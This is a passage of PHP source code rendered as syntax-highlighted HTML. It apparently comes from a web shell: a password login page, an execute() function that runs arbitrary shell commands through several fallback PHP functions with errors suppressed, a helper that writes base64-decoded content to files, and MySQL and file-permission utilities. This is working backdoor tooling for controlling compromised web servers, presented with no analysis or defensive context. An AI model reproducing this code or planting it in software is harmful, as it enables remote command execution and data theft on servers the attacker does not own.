<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">to</span> = $<span style="color: #f0c674;">page</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span>($<span style="color: #f0c674;">to</span> <span style="color: #81a2be;">&gt;</span> $<span style="color: #f0c674;">pages</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">from</span> = $<span style="color: #f0c674;">curpage</span> - $<span style="color: #f0c674;">pages</span> + $<span style="color: #f0c674;">to</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">to</span> = $<span style="color: #f0c674;">pages</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(($<span style="color: #f0c674;">to</span> - $<span style="color: #f0c674;">from</span>) &lt; $<span style="color: #f0c674;">page</span> &amp;&amp; ($<span style="color: #f0c674;">to</span> - $<span style="color: #f0c674;">from</span>) &lt; $<span style="color: #f0c674;">pages</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">from</span> = $<span style="color: #f0c674;">pages</span> - $<span style="color: #f0c674;">page</span> + <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">multipage</span> = ($<span style="color: #f0c674;">curpage</span> - $<span style="color: #f0c674;">offset</span> <span style="color: #81a2be;">&gt;</span> <span style="color: #c5c8c6; background-color: #1d1f21;">1</span> &amp;&amp; $<span style="color: #f0c674;">pages</span> &gt; $<span style="color: #f0c674;">page</span> ? <span style="color: #8abeb7;">'&lt;a href="javas</span><span style="color: #8abeb7; text-decoration: underline;">cript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'\', 1);"&gt;First&lt;/a&gt; '</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #f0c674; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> &gt; </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;"> ? </span><span style="color: #8abeb7; text-decoration: underline;">'&lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.($</span><span style="color: #f0c674; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> - </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">');"&gt;Prev&lt;/a&gt; '</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>($<span style="color: #f0c674;">i</span> = $<span style="color: #f0c674;">from</span>; $<span style="color: #f0c674;">i</span> &lt;= $<span style="color: #f0c674;">to</span>; $<span style="color: #f0c674;">i</span>++) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">multipage</span> .= $<span style="color: #f0c674;">i</span> == $<span style="color: #f0c674;">curpage</span> ? $<span style="color: #f0c674;">i</span>.<span style="color: #8abeb7;">' '</span> : <span style="color: #8abeb7;">'&lt;a href="javascript:settabl</span><span style="color: #8abeb7; text-decoration: underline;">e(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">i</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">');"&gt;['</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">i</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">']&lt;/a&gt; '</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">multipage</span> .= ($<span style="color: #f0c674;">curpage</span> &lt; $<span style="color: #f0c674;">pages</span> ? <span style="color: #8abeb7;">'&lt;a href="javascript:settable(\''</span>.$<span style="color: #f0c674;">ta</span><span style="color: #f0c674; text-decoration: underline;">blename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.($</span><span style="color: #f0c674; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> + </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">');"&gt;Next&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #f0c674; text-decoration: underline;">to</span><span style="text-decoration: underline;"> &lt; $</span><span style="color: #f0c674; text-decoration: underline;">pages</span><span style="text-decoration: underline;"> ? </span><span style="color: #8abeb7; text-decoration: underline;">' &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">pages</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">');"&gt;Last&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">multipage</span> = $<span style="color: #f0c674;">multipage</span> ? <span style="color: #8abeb7;">'&lt;p&gt;Pages: '</span>.$<span style="color: #f0c674;">multipage</span>.<span style="color: #8abeb7;">'&lt;/p&gt;'</span> : <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">multipage</span>;
}
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#30331;&#38470;&#20837;&#21475;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">loginpage</span>() {
<span style="color: #b294bb;">?&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;style</span> <span style="color: #81a2be;">type=</span><span style="color: #8abeb7;">"text/css"</span><span style="color: #81a2be;">&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #cc6666; font-weight: bold;">input</span> {<span style="color: #cc6666; font-weight: bold;">font</span>:<span style="color: #c5c8c6; background-color: #1d1f21;">11</span>px <span style="color: #cc6666; font-weight: bold;">Verdana</span>;<span style="color: #cc6666; font-weight: bold;">BACKGROUND</span>: <span style="color: #969896; font-style: italic;">#FFFFFF;height: 18px;border: 1px solid </span><span style="color: #969896; font-style: italic; text-decoration: underline;">#666666;}</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;/style&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;form</span> <span style="color: #81a2be;">method=</span><span style="color: #8abeb7;">"POST"</span> <span style="color: #81a2be;">action=</span><span style="color: #8abeb7;">""</span><span style="color: #81a2be;">&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;span</span> <span style="color: #81a2be;">style=</span><span style="color: #8abeb7;">"font:11px Verdana;"</span><span style="color: #81a2be;">&gt;</span><span style="color: #cc6666; font-weight: bold;">Password</span>: <span style="color: #81a2be;">&lt;/span&gt;&lt;input</span> <span style="color: #81a2be;">name=</span><span style="color: #8abeb7;">"password"</span> <span style="color: #81a2be;">typ</span><span style="color: #81a2be; text-decoration: underline;">e=</span><span style="color: #8abeb7; text-decoration: underline;">"password"</span><span style="text-decoration: underline;"> </span><span style="color: #81a2be; text-decoration: underline;">size=</span><span style="color: #8abeb7; text-decoration: underline;">"20"</span><span style="color: #81a2be; text-decoration: underline;">&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;input</span> <span style="color: #81a2be;">type=</span><span style="color: #8abeb7;">"hidden"</span> <span style="color: #81a2be;">name=</span><span style="color: #8abeb7;">"action"</span> <span style="color: #81a2be;">value=</span><span style="color: #8abeb7;">"login"</span><span style="color: #81a2be;">&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;input</span> <span style="color: #81a2be;">type=</span><span style="color: #8abeb7;">"submit"</span> <span style="color: #81a2be;">value=</span><span style="color: #8abeb7;">"Login"</span><span style="color: #81a2be;">&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;/form&gt;</span>
<span style="color: #b294bb;">&lt;?php</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end loginpage()</span>

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">execute</span>($<span style="color: #f0c674;">cfe</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">res</span> = <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">cfe</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">function_exists(</span><span style="color: #8abeb7;">'system'</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">ob_start(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">system(</span>$<span style="color: #f0c674;">cfe</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">res</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">ob_get_contents(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">ob_end_clean(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">function_exists(</span><span style="color: #8abeb7;">'passthru'</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">ob_start(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">passthru(</span>$<span style="color: #f0c674;">cfe</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">res</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">ob_get_contents(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">ob_end_clean(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">function_exists(</span><span style="color: #8abeb7;">'shell_exec'</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">res</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">shell_exec(</span>$<span style="color: #f0c674;">cfe</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">function_exists(</span><span style="color: #8abeb7;">'exec'</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">exec(</span>$<span style="color: #f0c674;">cfe</span>,$<span style="color: #f0c674;">res</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">res</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">join(</span><span style="color: #8abeb7;">"\n"</span>,$<span style="color: #f0c674;">res</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span>(@<span style="color: #c5c8c6; background-color: #1d1f21;">is_resource(</span>$<span style="color: #f0c674;">f</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">popen(</span>$<span style="color: #f0c674;">cfe</span>,<span style="color: #8abeb7;">"r"</span>))) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">res</span> = <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>(!@<span style="color: #c5c8c6; background-color: #1d1f21;">feof(</span>$<span style="color: #f0c674;">f</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">res</span> .= @<span style="color: #c5c8c6; background-color: #1d1f21;">fread(</span>$<span style="color: #f0c674;">f</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">1024</span>);<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">pclose(</span>$<span style="color: #f0c674;">f</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">res</span>;
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">which</span>($<span style="color: #f0c674;">pr</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">path</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">execute(</span><span style="color: #8abeb7;">"which $pr"</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> ($<span style="color: #f0c674;">path</span> ? $<span style="color: #f0c674;">path</span> : $<span style="color: #f0c674;">pr</span>);<span style="color: #cc6666; background-color: #373b41;"> </span>
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">cf</span>($<span style="color: #f0c674;">fname</span>,$<span style="color: #f0c674;">text</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">fp</span>=@<span style="color: #c5c8c6; background-color: #1d1f21;">fopen(</span>$<span style="color: #f0c674;">fname</span>,<span style="color: #8abeb7;">'w'</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">fputs(</span>$<span style="color: #f0c674;">fp</span>,@<span style="color: #c5c8c6; background-color: #1d1f21;">base64_decode(</span>$<span style="color: #f0c674;">text</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">fclose(</span>$<span style="color: #f0c674;">fp</span>);
<span style="background-color: #373b41;"> </span>   }
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">dirsize</span>($<span style="color: #f0c674;">dir</span>) {<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dh</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">opendir(</span>$<span style="color: #f0c674;">dir</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">size</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>($<span style="color: #f0c674;">file</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">readdir(</span>$<span style="color: #f0c674;">dh</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">file</span> != <span style="color: #8abeb7;">'.'</span> &amp;&amp; $<span style="color: #f0c674;">file</span> != <span style="color: #8abeb7;">'..'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">path</span> = $<span style="color: #f0c674;">dir</span>.<span style="color: #8abeb7;">'/'</span>.$<span style="color: #f0c674;">file</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">size</span> += @<span style="color: #c5c8c6; background-color: #1d1f21;">is_dir(</span>$<span style="color: #f0c674;">path</span>) ? <span style="color: #c5c8c6; background-color: #1d1f21;">dirsize(</span>$<span style="color: #f0c674;">path</span>) : @<span style="color: #c5c8c6; background-color: #1d1f21;">filesize(</span>$<span style="color: #f0c674;">path</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">closedir(</span>$<span style="color: #f0c674;">dh</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">size</span>;
}
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#39029;&#38754;&#35843;&#35797;&#20449;&#24687;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">debuginfo</span>() {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> $<span style="color: #f0c674;">starttime</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">mtime</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">explode(</span><span style="color: #8abeb7;">' '</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">microtime(</span>));
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">totaltime</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">number_format(</span>($<span style="color: #f0c674;">mtime</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>] + $<span style="color: #f0c674;">mtime</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>] - $<span style="color: #f0c674;">starttime</span>), <span style="color: #c5c8c6; background-color: #1d1f21;">6</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">'Processed in '</span>.$<span style="color: #f0c674;">totaltime</span>.<span style="color: #8abeb7;">' second(s)'</span>;
}

<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#36830;&#25509;MYSQL&#25968;&#25454;&#24211;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">mydbconn</span>($<span style="color: #f0c674;">dbhost</span>,$<span style="color: #f0c674;">dbuser</span>,$<span style="color: #f0c674;">dbpass</span>,$<span style="color: #f0c674;">dbname</span>=<span style="color: #8abeb7;">''</span>,$<span style="color: #f0c674;">charset</span>=<span style="color: #8abeb7;">''</span>,$<span style="color: #f0c674;">dbport</span>=<span style="color: #8abeb7;">'3306'</span>)<span style="text-decoration: underline;"> {</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> $<span style="color: #f0c674;">charsetdb</span>;
<span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">ini_set(</span><span style="color: #8abeb7;">'mysql.connect_timeout'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">5</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(!$<span style="color: #f0c674;">link</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_connect(</span>$<span style="color: #f0c674;">dbhost</span>.<span style="color: #8abeb7;">':'</span>.$<span style="color: #f0c674;">dbport</span>, $<span style="color: #f0c674;">dbuser</span>, $<span style="color: #f0c674;">dbpass</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;h2&gt;Can not connect to MySQL server&lt;/h2&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">link</span> &amp;&amp; $<span style="color: #f0c674;">dbname</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!@<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_select_db(</span>$<span style="color: #f0c674;">dbname</span>, $<span style="color: #f0c674;">link</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;h2&gt;Database selected has error&lt;/h2&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">link</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">mysql_get_server_info(</span>) &gt; <span style="color: #8abeb7;">'4.1'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">charset</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">in_array(strtolower(</span>$<span style="color: #f0c674;">charset</span>), $<span style="color: #f0c674;">charsetdb</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"SET character_set_connection=$charset, character_set_results=$cha</span><span style="color: #8abeb7; text-decoration: underline;">rset, character_set_client=binary;"</span><span style="text-decoration: underline;">, $</span><span style="color: #f0c674; text-decoration: underline;">link</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">link</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#21435;&#25481;&#36716;&#20041;&#23383;&#31526;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">s_array</span>(&amp;$<span style="color: #f0c674;">array</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">is_array(</span>$<span style="color: #f0c674;">array</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> ($<span style="color: #f0c674;">array</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">k</span> =&gt; $<span style="color: #f0c674;">v</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">array</span>[$<span style="color: #f0c674;">k</span>] = <span style="color: #c5c8c6; background-color: #1d1f21;">s_array(</span>$<span style="color: #f0c674;">v</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">is_string(</span>$<span style="color: #f0c674;">array</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">array</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">stripslashes(</span>$<span style="color: #f0c674;">array</span>);
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">array</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#28165;&#38500;HTML&#20195;&#30721;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">html_clean</span>($<span style="color: #f0c674;">content</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">content</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">htmlspecialchars(</span>$<span style="color: #f0c674;">content</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">content</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(</span><span style="color: #8abeb7;">"\n"</span>, <span style="color: #8abeb7;">"&lt;br /&gt;"</span>, $<span style="color: #f0c674;">content</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">content</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(</span><span style="color: #8abeb7;">"  "</span>, <span style="color: #8abeb7;">"&amp;nbsp;&amp;nbsp;"</span>, $<span style="color: #f0c674;">content</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">content</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(</span><span style="color: #8abeb7;">"\t"</span>, <span style="color: #8abeb7;">"&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;"</span>, $<span style="color: #f0c674;">content</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">content</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#26435;&#38480;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getChmod</span>($<span style="color: #f0c674;">filepath</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">substr(base_convert(</span>@<span style="color: #c5c8c6; background-color: #1d1f21;">fileperms(</span>$<span style="color: #f0c674;">filepath</span>),<span style="color: #c5c8c6; background-color: #1d1f21;">10</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">8</span>),-<span style="color: #c5c8c6; background-color: #1d1f21;">4</span>);
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getPerms</span>($<span style="color: #f0c674;">filepath</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">mode</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">fileperms(</span>$<span style="color: #f0c674;">filepath</span>);
